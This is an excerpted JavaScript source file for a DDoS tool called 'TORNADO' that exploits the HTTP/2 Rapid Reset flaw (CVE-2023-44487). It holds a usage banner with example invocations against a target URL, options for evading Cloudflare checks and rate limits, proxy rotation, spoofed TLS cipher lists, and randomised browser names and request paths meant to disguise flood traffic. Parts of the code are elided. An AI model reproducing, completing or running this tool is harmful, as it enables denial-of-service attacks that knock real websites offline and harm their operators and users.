...
const targetDate = new Date('2029-10-25');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    TORNADO ${ver} Method (CVE-2023-44487) // Updated: 28.08.2024 // With love @rapidreset :3
    ...
    How to use & example:
      ...
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 128 proxy.txt

    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
      --delay <1-1000/rand> - delay between requests 1-100 ms (optimal) default 1 ms
      ...
      --ua "curl/4.0" - (example) for custom agents
      --status - for closed session with 403,400,429 codes
      --parsed - for parse set-cookie very good
      --ip - for browser fr good option
      --full - makes as many requests as possible (not for cloudflare)
      --randrate - make random ratelimit 1-128
      `);
    process.exit(1);
}
...
if (url.pathname.includes("%RAND%")) {
    url.pathname = url.pathname.replace(/%RAND%/g, () => randstr(6));
}
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', async () => {
            tlsSocket = tls.connect({
                ...
                servername: url.host,
                ciphers: 'GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-CBC-SHA:ECDHE-RSA-AES256-CBC-SHA:RSA-AES128-GCM-SHA256:RSA-AES256-GCM-SHA384:RSA-AES128-CBC-SHA:RSA-AES256-CBC-SHA',
                ...
                async function doWrite() {
                    ...
                    // if (randrate) {
                    //     ratelimit = getRandomInt(1, 128); // Генерация случайного значения между 1 и 128
                    // } else {
                    //     ratelimit = process.argv[6]; // Используем значение из аргумента командной строки
                    // }
                    ...
                    async function sendRequest() {
                        ...
                        const fwfw = ['Google Chrome', 'Brave', 'Microsoft Edge'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        ...
                        const headers = Object.entries({
                            ...
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : (randpath() || url.pathname)
                        ...
                        function randpath() {
                            if (useRandPath) {
                                return url.pathname + ememmmmmemmeme(5, 5);
                            }
                        }
